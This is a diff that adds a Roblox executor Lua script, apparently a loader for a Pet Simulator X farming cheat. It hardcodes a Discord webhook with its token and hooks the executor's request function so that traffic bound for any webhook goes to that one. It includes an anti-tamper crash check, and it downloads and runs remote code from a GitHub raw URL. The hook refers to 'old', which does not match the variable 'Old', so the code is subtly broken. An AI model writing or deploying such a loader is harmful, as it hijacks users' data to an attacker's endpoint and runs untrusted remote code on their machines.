@@ -1,0 +1,21 @@
+_G.UserID = 1690659151
+_G.WebHook = "https://discord.com/api/webhooks/1062656949583347733/K1bMcxRdj4KKmrfZjoxekac-DxYQAgi5qZ0oqpKcLlVIk29cvTP0WevHvZdYBjeg8lzr"
+_G.LoadingScreenText = "Here!!"
+local syn = syn
+if Krnl then syn = Krnl end
+
+if islclosure(syn.request) then 
+   rconsolewrn("no lo")
+     LPH_CRASH()
+end
+
+local Old = syn.request
+setreadonly(syn, false)
+syn.request = function(Data)
+  if string.find(Data.Url, "Webhook") then
+    Data.Url = _G.WebHook
+end
+return old(Data)
+end
+
+loadstring(game:HttpGet('https://raw.githubusercontent.com/acelath20/PetSimulatorXFarm/main/PetSimulatorXFarm'))()
